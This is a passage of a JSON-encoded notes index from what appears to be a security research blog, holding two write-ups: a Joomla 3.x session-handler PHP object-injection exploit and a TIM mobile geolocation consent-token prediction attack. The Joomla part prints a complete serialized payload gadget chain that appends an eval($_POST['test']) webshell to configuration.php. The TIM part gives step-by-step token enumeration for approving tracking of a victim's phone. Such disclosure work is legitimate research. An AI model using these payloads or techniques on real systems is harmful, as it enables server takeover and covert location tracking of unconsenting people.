3.4.6) session stored in the database for an unauthenticated user (at table `__session`):\n\n![img](/notes/images/rusty/0.png)\n\nThere are many objects defined, but the most interesting thing is how input parameters are handled in the session. If we make a regular action with parameters, these ones and the result message of the action, are stored in the session object like this:\n\n![img](/notes/images/rusty/1.png)\n\nWhen we perform POST requests in Joomla we usually have a 303 redirect that will redirect us to the result page. That’s an important note for the exploitation, because the first request (with parameters) will only cause Joomla to perform the action and store (e.g. call the `write()` function) the session, then the 303 redirect will retrieve (e.g. call the `read()` function) it and display the message back to the user.\n\n## The vulnerability\nThis is the code for the read and write functions (just removed unnecessary code).\n\n![img|500](/notes/images/rusty/2.png)\n\nThe write function accept 2 parameters, the `session_id` (from the cookie) and the serialized object. Before storing data into the database there is an interesting replace of `\\x00\\x2a\\x00` (`chr(0).\"*\".chr(0)`) with `\\0\\0\\0`. That’s because MySQL cannot save null bytes and `$protected` variables are prefixed with `\\x00\\x2a\\x00` in the serialized object. \n\nOn the other hand, when reading, the read function will replace `\\0\\0\\0` with `\\x00\\x2a\\x00` in order to reconstruct the original object.\n\nThe main issue with this replace is that it’s replacing 3 bytes with 6 bytes:\n\n![img|500](/notes/images/rusty/3.png)\n\nThis behaviour has been introduced from the 3.0.0 version and affecting Joomla until 3.4.6. Starting from 3.4.7 the piece of code is still present but the session is base64 encoded and stored in the database.\n\nAs I said before, we can manipulate the session object through action parameters. In this way, we can inject `\\0\\0\\0` that will be replaced from the read function with 3 bytes, invalidating the object because of incorrect size. If we take the login form as a target and we put `my\\0\\0\\0username` in the username field, we end up with the following part of object in the database:\n\n```php\ns:8:s:\"username\";s:16:\"my\\0\\0\\0username\"\n```\n\nWhen the session object is read from the read function, `\\0\\0\\0` will be replaced as demonstrated before, assembling the following value:\n\n```php\ns:8:s:\"username\";s:16:\"myN\\*Nusername\" --\u003e Invalid Size\n```\nThe replaced string is only 13 bytes long but the declared string size is still 16!\nWe can now take this ‘overflow’ to our advantage and forge a new object that will lead us to the final goal... RCE! :)\n\n## Exploitation\nIn order to trigger our arbitrary object and achieve RCE we need two parameters in a row, the first one will cause the ‘overflow’ and the second will contain the last part of the exploit. The perfect target (included in a default installation) is the login form with the ‘username’ and ‘password’ fields.\n\nThat’s the plan:\n- Overflow the username field with enough `\\0\\0\\0` in order to land in the password field\n- Reconstruct a valid object\n- Send the exploit\n- Trigger the exploit (with the redirect)\n\nWe know that we can downsize the string size. By doing that on the username field (that precede the password) we can fake it and let it ends inside the next parameter under our control.\n\n```php\n[..]s:8:s:\"username\";s:10:\"MYUSERNAME\";s:8:\"password\";s:10:\"MYPASSWORD\"[...]\n```\n\nAs you can see, the distance from the end of the username value and the start of the password is 27 bytes. The vulnerable replace let us decrease the value with a multiple of 3 (6 bytes - 3 bytes) so we need at least 8 times `\\0\\0\\0` in the username field that will cause a simple padding of 1 extra character in the second parameter in our exploit (in the POC I used 9 times `\\0\\0\\0` to be sure).\n\nIn bold, what unserialize read for the `username`:\n\n---\n(in database)\ns:8:s:\"username\";s:54:\"**\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0**\";s:8:\"password\";s:10:\"MYPASSWORD\"\n\n\n(after read and replace)\ns:8:s:\"username\";s:54:\"**NNNNNNNNNNNNNNNNNNNNNNNNNNN\";s:8:\"password\";s:10:\"MYPA**SSWORD\"\n\n(Achieve Object injection):\ns:8:s:\"**username**\";s:54:\"**NNNNNNNNNNNNNNNNNNNNNNNNNNN\";s:8:\"password\";s:10:\"MYPA**\";s:2:\"HS\":O:15:\"ObjectInjection\"[...]\n\n---\nWe have a stable way to inject an Object, now it’s the time to craft it.\nWe can use the payload from the CVE-2015-8562 exploit as a starting point, however it requires some modification:\n\n```php\nO:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:6:\"assert\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";\n```\n\nThis payload will instantiate a `JDatabaseDriverMysqli` object and assign an array of other objects in the `disconnectHandlers` attribute (a protected array variable). This is because the defined `__destruct` of this class will call `$this-\u003edisconnect()`, that leads to an interesting `call_user_func_array()`:\n\n![img8|500](/notes/images/rusty/4.png)\n\nFor each value in the `disconnectHandlers` array a `call_user_func_array()` is performed with a reference to the object (`\u0026$this`) as a parameter. It’s a good gadget, but we only have control over the function call and not on parameters. That’s where `SimplePie` object came in our help.\n\nIn `SimplePie::init` (declared in `libraries/simplepie/simplepie.php`) we have different interesting gadgets, like the following:\n\n![img](/notes/images/rusty/5.png)\n\n\nThis is much more suitable, because we have a `call_user_func` with both function and parameter values under our control.\nHowever, that’s why I think the original payload wasn’t working, there is a condition that must be met in order to receive this line of code: `$this-\u003ecache` must be declared and `$parsed_feed_url[‘scheme’]` (the parsed url from $feed_url) needs to contain something.\nBypassing this condition was not so difficult. At first, with `cache_name_function` set to `system`, something like `https://something/;id` was enough. The first command fails but the semicolon do the rest.\n\nHowever, while developing the Metasploit module, I was not so happy about this solution. If the target environment have disabled functions like `system`, `exec`, `shell_exec`, etc., you cannot do a lot with this exploit, and I wanted to make something more suitable for more environments.\nSo, I moved back to the assert function and see if I could achieve the PHP code execution while respecting the condition. The only think the condition is checking for is a string that contains a valid schema (e.g. `http://` ), but this will cause a syntax error. In order to bypass it we can chain an OR (||) statement and trap the schema into a variable, like this:\n\n```php\n\u003cPHP CODE\u003e || $a=\"http//\";\n```\n\nWe were limited again against some special characters (like `?`) and from the `assert` function, so we need a way to move on a less restrictive environment. The first idea was to create a php file in the root directory with an `eval()`, but without the `?` the web server will not interpret our code. A `configuration.php` file is present in the root directory. It is nothing more than a class declaration with configuration parameters in it. We can append an eval at the end of this file and use it to execute PHP code with the following payload:\n\n```php\n file_put_contents('configuration.php','if(isset($_POST[\\\\\\'test\\\\\\'])) eval($_POST[\\\\\\'test\\\\\\']);\\', FILE_APPEND) || $a=\\'http://wtf\\';\n```\n\nThat will result in the following call:\n\n```php\ncall_user_func(\"assert\",\"file_put_contents('configuration.php','if(isset($_POST[\\\\\\'test\\\\\\'])) eval($_POST[\\\\\\'test\\\\\\']);\\', FILE_APPEND) || $a=\\'http://wtf\\';\")\n```\nAt the end, this is the final object:\n\n```php\ns:2:\"HS\":O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:6:\"assert\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:125:\"file_put_contents('configuration.php','if(isset($_POST[\\'test\\'])) eval($_POST[\\'test\\']);', FILE_APPEND) || $a='http://wtf';\";}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";i:1;}\n```\n\nNow we have everything necessary to develop a working exploit. Putting stuff together, we can send the exploit using the login form, this will store the malicious object into the database.\nThen we can follow the redirect from the first response and the payload will be retrieved from the database and unserialized from the `session_start()` function and .. we got RCE!\n\n\n## POC\n\u003ciframe width=\"480\" height=\"360\" src=\"https://www.youtube.com/embed/Z-GbT5YB-Tc\" frameborder=\"0\"\u003e \u003c/iframe\u003e\n\n## Exploit\n- https://www.exploit-db.com/exploits/47465\n- https://www.exploit-db.com/exploits/47539 (Metasploit)\n\n## References\n- https://nvd.nist.gov/vuln/detail/CVE-2015-8562\n- https://blog.ripstech.com/2018/woocommerce-php-object-injection/\n- https://www.php.net/manual/en/ref.session.php","lastmodified":"2025-04-14T13:32:05.604086015Z","tags":null},"/notes/TIM-Mobile-Phone-Geolocalization":{"title":"TIM Mobile Phone Geolocalization","content":"\nDuring the monthly research activity in [Hacktive Security](https://hacktivesecurity.com/), we found and went in depth with an interesting security issue allowing geolocation of mobile devices using TIM, an Italian communication provider. A malicious user could find the TIM customers geo-position by forcing the approval mechanism to allow the geopositional tracking. \n\nThe research has been focused on TerminalLocation API service provided by TIM on its API Store.\nTerminalLocation lets retrieve location of arbitrary devices by their phone numbers.\nBelow a service description provided by TIM:\n\nWith TIM API - TerminalLocation track and monitor the location of mobile devices using geographic coordinates (latitude and longitude), date and time. Location information are valid for TIM customers.“\n\nLet's see how it works.\n\n## Overview of the service\n\nIn order to use the API service, we needed to sign up and then create a test application to retrieve an API key.\nHence, you can make a GET request to `/try/location/v1.1/\u003cPHONE_NUMBER\u003e` including the API key in the request header. If this is the first request targeting the phone number, an SMS is sent asking for an authorization approval to notify the current position at any time.\n\n\n![img1|200](/notes/images/tim/1.png)\n\nIn order to accept being geolocalized, the user has to click on the link in the message, which contains a base64 encoded user-token, and then click the confirmation button.\n\n![img2|200](/notes/images/tim/2.png)\n\nThis action triggers a GET request to /tim/api/unsecured/consenso/\\\u003cuser-token\\\u003e.\nEverything seems ok, users have to agree in order to use this service. But things turned out for the best, almost...\n\n## Vulnerability\n\nWe started to collect multiple tokens and we were surprised about their low entropy.\nThe base64 string sent within the link hides a 24 character token with both static and at first glance random values. If we break up some tokens, obtained within the same day and with few hours of delay, we noticed the following schema:  \n\n```\n\nXXXX AAAA YYYYYYYYYYYYYYY D  \nXXXX BBBB YYYYYYYYYYYYYYY E  \nXXXX CCCC YYYYYYYYYYYYYYY F  \n```\n(next day) \n```\n\nXXXX GGGG ZZZZZZZZZZZZZZZ H  \n```\n\nThe schema may be decoded as follows:\n- First part: the 4 Xs are always the same, they may be a static value\n- Second part: the 4 As, Bs, Cs and Ds are random characters\n- Third part: the 15 Ys and Zs are constants changing day by day; it may be related to the current date\n- Fourth part: the E, F, G, H are random characters\n\nWe have confirmed that these tokens are not randomly generated and they have pretty easylogic behind.\n\nThe crucial test consisted to send requests for 2 tokens in a very short period of time (2 seconds):\n\n```\nXXXX XXDD YYYYYYYYYYYYYYY A  \nXXXX XXFF YYYYYYYYYYYYYYY B\n```\n\n\nBingo!\nThey differ for just 3 characters and they are incremental!\n\nAt this point, we could easily guess with more confidence how tokens are generated: The first 4 characters are always the same, then 4 characters could be related to a timestamp, because they are consecutive, then 15 characters related to the current day and finally 1 random character in the last position.\nWith this insight we could create an enumeration tool, but another key point was reducing the character set:\nA request with a syntactically correct token returns an error message containing \"agreement not found\":\n\n![img3](/notes/images/tim/3.png)\n\nWith a malformed token (invalid length or invalid character set) it says Invalid parameters:\n\n![img3](/notes/images/tim/4.png)\n\nAfter few fuzzing requests we could determine that all characters were in a hexadecimal format, reducing a lot the enumeration (16 characters instead of 36 characters of all lowercase alphabet plus numbers).\n\n## Exploitation\n\nThe exploitation has been pretty easy:\n- Receive a token on our phone via SMS\n- Send the second token to the victim after few seconds\n- Deduce victim’s token from our one.\n- Localize the phone!\n\nIn order to automate this process, we wrote a few lines in python.\nFirst, request two tokens with two seconds of delay (the first token to us and the second to the victim).\nThe timing is crucial because of its consecutive logic based on some sort of timestamp.\n\n![img4](/notes/images/tim/5.png)\n\nAttacker’s token:\n\n\n![img5|300](/notes/images/tim/6.png)\n\n\nNow we have the token generated before the victim’s one and we can easily predict it with an enumeration with 2 characters starting at the 6th position and one last character.\n\n![img6](/notes/images/tim/7.png)\n\nThanks to multi-threading and, of course, low entropy, this enumeration took less than 1 second to retrieve the victim’s token.\nWith that token, we can now accept the agreement to the service with a PUT request to `/tim/api/unsecured/consenso/\u003ctoken\u003e?operazione=APPROVA` and geolocate the victim phone:\n\n![img7](/notes/images/tim/8.png)\n\n![img8](/notes/images/tim/8.png)\n\n\nAnd that's it :)","lastmodified":"2025-04-14T13:32:05.604086015Z","tags":null},"/notes/ZZTEmplate":{"title":"TODO","content":"","lastmodified":"2025-04-14T13:32:05.604086015Z","tags":null}}